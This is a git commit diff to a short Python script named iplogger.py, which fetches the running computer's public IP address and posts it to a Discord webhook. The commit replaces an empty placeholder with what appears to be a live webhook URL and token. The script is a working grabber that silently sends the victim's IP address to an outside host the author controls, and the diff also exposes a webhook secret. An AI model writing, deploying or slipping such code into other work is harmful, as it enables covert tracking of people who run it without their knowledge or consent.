411a20888103f01b3a86b6ac93e6e623c28a6aad
Krzx#1337 <81083343+bl-d@users.noreply.github.com>
2022-07-25 05:20:21 +0100

    Update iplogger.py

--- iplogger.py
+++ iplogger.py
@@ -1,6 +1,6 @@
 import requests, json
 from requests import get
 
-wh= " " #webhook link here
+wh= "https://canary.discord.com/api/webhooks/1000980762885115944/S2VthrlFckvS8sVvTb1YQkhsERUlkM73usydiNGTQt5vGKByPzPsLH_wJx6O7GABmAUF" #webhook link here
 ipaddress = get('https://api.ipify.org').text  #If  you'd like more than the ip address simply use a different api.
 requests.post(wh, data=json.dumps({ "embeds": [ { "fields": [ { "name": "ip", "value": f"``{ipaddress}``"} ] } ] }), headers={"Content-Type": "application/json"})
